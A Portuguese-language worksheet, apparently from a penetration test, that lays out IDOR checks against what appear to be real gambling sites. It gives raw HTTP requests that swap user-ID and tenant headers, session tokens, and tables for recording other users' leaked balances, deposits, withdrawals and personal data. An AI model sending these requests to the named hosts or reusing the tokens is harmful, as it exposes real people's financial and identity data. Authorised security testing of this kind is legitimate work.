# B4 — IDOR (Insecure Direct Object Reference)

**Objetivo:** Trocar IDs de usuário em endpoints autenticados e ver se
o backend retorna dados de OUTROS usuários.

> Para cada endpoint abaixo, teste com os IDs: `1`, `2`, `100`,
> `137001`, `137026`, `137028`, `999999`. Cole resposta resumida (só os
> campos relevantes — não precisa o JSON inteiro pra cada um).

---

## ⚠️ TESTES PRIORITÁRIOS (descobertos na sessão 2026-06-08)

### P1 — Confirmar que `userId` realmente é honrado

Você fez `GET /japi/user/balance/querySimpleBalance?userId=137028` e veio
`{amount:0,withdrawAmount:0,inviteAmount:0}`.
Antes de afirmar IDOR, precisamos saber: o backend está **honrando** o
`userId=137028` ou está **ignorando** e devolvendo seu próprio (137027)?

**Faça os 3 testes na sequência:**

| # | URL                                                            | Status | data.amount | data.withdrawAmount |
|---|----------------------------------------------------------------|--------|-------------|---------------------|
| 1 | `/japi/user/balance/querySimpleBalance` (sem param)            |        |             |                     |
| 2 | `/japi/user/balance/querySimpleBalance?userId=137027` (vc)     |        |             |                     |
| 3 | `/japi/user/balance/querySimpleBalance?userId=137028`          |        |             |                     |
| 4 | `/japi/user/balance/querySimpleBalance?userId=1`               |        |             |                     |
| 5 | `/japi/user/balance/querySimpleBalance?userId=999999999`       |        |             |                     |

**Conclusão (preencher após o teste):**
- [ ] Param ignorado (todos retornam mesma coisa) → não é IDOR clássico, mas o param sugere intent vulnerável (avisar o time)
- [ ] Param honrado mas todos vazios → endpoint retorna zero pra qualquer ID que não seja você (não vaza nada)
- [ ] Param honrado e retorna saldo real de outros → **IDOR CONFIRMADO, severidade ALTA**

---

### P2 — `Nbcx` swap em `hus3wyear.ccgamevip.com`

O endpoint `/prod-api/year/api/yearRechargeReward` aceita o header
`Nbcx: 207587` (userId) junto com `Token: 207587:...`. Teste se
trocar APENAS o `Nbcx` (mantendo o token) muda o user retornado.

```
GET /prod-api/year/api/yearRechargeReward HTTP/2
Host: hus3wyear.ccgamevip.com
Nbcx: 137028                ← TROCAR este valor
Xutc: aphrodite777
Token: 207587:1781026736:3001:3d1022d4885108c66afee70e43c58ebc
```

| `Nbcx` | Status | data.userId no body | Notas |
|--------|--------|----------------------|-------|
| 207587 (original) | 200 | 207587 |       |
| 137028 |        |                       |       |
| 1      |        |                       |       |
| 137027 |        |                       |       |

Se `data.userId` mudar conforme o `Nbcx`, é **IDOR via header**.

---

### P3 — `Xutc` swap (cross-tenant)

Mesmo endpoint, mas trocando o tenant:

```
GET /prod-api/year/api/yearRechargeReward HTTP/2
Host: hus3wyear.ccgamevip.com
Nbcx: 207587
Xutc: amizade777            ← TROCAR este valor
Token: 207587:1781026736:3001:3d1022d4885108c66afee70e43c58ebc
```

| `Xutc`         | Status | code | msg | Notas |
|----------------|--------|------|-----|-------|
| aphrodite777   | 200    | 200  |     |       |
| amizade777     |        |      |     |       |
| lucky777       |        |      |     |       |
| rainha777slots |        |      |     |       |
| megaslott      |        |      |     |       |

Se algum tenant diferente aceitar o token de `aphrodite777`, é
**reúso de credencial cross-tenant** — vulnerabilidade séria.

---

## E1 — `GET /prod-api/player/info?id=<ID>`

| ID      | Status | Retornou dados de outro user? | Campos vazaram |
|---------|--------|-------------------------------|----------------|
| 1       |        |                               |                |
| 2       |        |                               |                |
| 100     |        |                               |                |
| 137001  |        |                               |                |
| 137026  |        |                               |                |
| 137028  |        |                               |                |
| 999999  |        |                               |                |

Exemplo de response interessante (cole 1 caso aqui se algo vazar):
```
```

---

## E2 — `GET /prod-api/player/info?userId=<ID>`

| ID      | Status | Vazou? | Notas |
|---------|--------|--------|-------|
| 1       |        |        |       |
| 137028  |        |        |       |
| 999999  |        |        |       |

---

## E3 — `POST /prod-api/player/info` body `{"userId": 137028}`

```
<request + response>
```

---

## E4 — `GET /japi/user/balance/querySimpleBalance?userId=<ID>`

> **Sessão 2026-06-08:** Teste com `userId=137028` retornou
> `{amount:0,withdrawAmount:0,inviteAmount:0}` mas usuário relata que
> "qualquer número me volta esse resultado" — provável que o param
> esteja sendo ignorado. Confirmação está nos testes P1 acima.

### Request (referência, sessão 2026-06-08)
```
GET /japi/user/balance/querySimpleBalance?userId=137028 HTTP/2
Host: ds.amizade777.com
Token: 137027:1780956891:3001:7964d1412a3f879b5472841e51bf735f
```

### Response
```
HTTP/2 200 OK
{"code":200,"msg":null,"data":{"amount":0,"withdrawAmount":0,"inviteAmount":0},"total":0}
```

| ID      | Status | Saldo retornado | Notas |
|---------|--------|-----------------|-------|
| 137026  |        |                 |       |
| 137028  | 200    | 0               | Pode ser ignorado (P1) |
| 1       |        |                 |       |

---

## E5 — `GET /japi/user/player/<ID>` (path param)

| ID      | Status | Vazou perfil? | Notas |
|---------|--------|---------------|-------|
| 137026  |        |               |       |
| 137028  |        |               |       |
| 1       |        |               |       |

---

## E6 — `GET /prod-api/recharge-list?userId=<ID>`

| ID      | Status | Listou depósitos de outro user? |
|---------|--------|----------------------------------|
| 137028  |        |                                  |
| 1       |        |                                  |

---

## E7 — `GET /prod-api/payment/withdraw-list?userId=<ID>`

| ID      | Status | Listou saques de outro user? |
|---------|--------|------------------------------|
| 137028  |        |                              |
| 1       |        |                              |

---

## E8 — `GET /prod-api/invite/userInvite?id=<ID>`

| ID      | Status | Vazou rede de convites? |
|---------|--------|--------------------------|
| 137028  |        |                          |
| 1       |        |                          |

---

## Resumo IDOR

- Total de endpoints vulneráveis:
- Total de campos sensíveis vazados (saldo, telefone, email, CPF):
- Achado mais grave:
